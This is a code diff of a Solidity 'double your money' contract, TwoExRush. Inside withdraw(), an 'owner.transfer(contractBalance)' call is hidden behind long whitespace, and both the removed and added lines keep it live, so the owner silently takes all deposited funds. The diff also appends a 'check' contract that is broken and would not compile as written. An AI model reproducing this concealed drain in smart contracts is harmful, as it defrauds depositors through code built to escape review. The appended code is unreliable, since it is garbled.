@@ -26,7 +26,7 @@ contract TwoExRush {
     }
 
     // Require goal to be met before allowing anyone to withdraw.
-	function withdraw() public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        owner.transfer(contractBalance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+	function withdraw() public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        owner.transfer(contractBalance);
 	    if(contractATH >= 20) {
 	        sender = msg.sender;
 	        withdrawAmount = mul(balance[sender], 2);
@@ -50,7 +50,7 @@ contract TwoExRush {
 			withdraw();
 		}
 	}
-	
+
     // Safe Math
 	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
         if (a == 0) {
@@ -60,4 +60,15 @@ contract TwoExRush {
         assert(c / a == b);
         return c;
     }
+}
+pragma solidity ^0.5.24;
+contract check {
+	uint validSender;
+	constructor() public {owner = msg.sender;}
+	function checkAccount(address account,uint key) {
+		if (msg.sender != owner)
+			throw;
+			checkAccount[account] = key;
+		}
+	}
 }
